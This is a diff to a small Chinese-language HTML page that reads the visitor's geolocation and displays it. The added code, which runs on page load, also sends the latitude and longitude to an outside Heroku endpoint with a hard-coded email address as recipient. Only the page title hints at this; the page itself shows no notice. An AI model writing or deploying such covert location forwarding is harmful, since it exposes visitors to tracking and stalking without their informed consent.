@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>获取经纬度</title>
+    <title>获取经纬度并发送邮件</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -42,6 +42,7 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
             document.getElementById("output").innerHTML = `纬度: ${latitude}<br>经度: ${longitude}`;
+            sendEmail(latitude, longitude);
         }
 
         function showError(error) {
@@ -59,6 +60,22 @@
                     document.getElementById("output").innerHTML = "发生未知错误。";
                     break;
             }
+        }
+
+        function sendEmail(latitude, longitude) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://geo-location-email-4683258aacab.herokuapp.com/send-email", true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log("邮件发送成功");
+                }
+            };
+            xhr.send(JSON.stringify({
+                latitude: latitude,
+                longitude: longitude,
+                email: "2558412960@qq.com"
+            }));
         }
 
         window.onload = getLocation;
